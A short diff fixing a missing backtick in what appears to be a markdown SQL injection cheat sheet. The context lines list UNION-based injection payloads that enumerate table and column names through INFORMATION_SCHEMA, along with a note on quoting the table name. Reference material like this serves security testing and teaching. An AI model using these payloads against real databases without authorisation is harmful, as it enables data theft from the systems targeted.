@@ -128,7 +128,7 @@ SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 
 Use following query to get table_names or column_names:
 1. `' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES--`
-2. `' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<table_name>'--
+2. `' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<table_name>'--`
 
 **The table name in 2nd query needs to be in qoutes.**
 
